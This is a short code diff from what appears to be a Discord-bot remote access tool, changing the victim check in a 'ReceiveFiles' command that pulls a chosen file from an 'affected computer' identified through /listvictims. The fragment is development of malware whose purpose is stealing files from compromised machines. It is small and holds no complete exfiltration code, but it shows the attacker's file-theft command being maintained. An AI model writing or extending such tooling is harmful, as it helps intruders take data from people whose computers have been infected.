@@ -18,7 +18,7 @@ class ReceiveFiles(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         file_path: Path of the file for receiving.
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             if '"' in file_path:
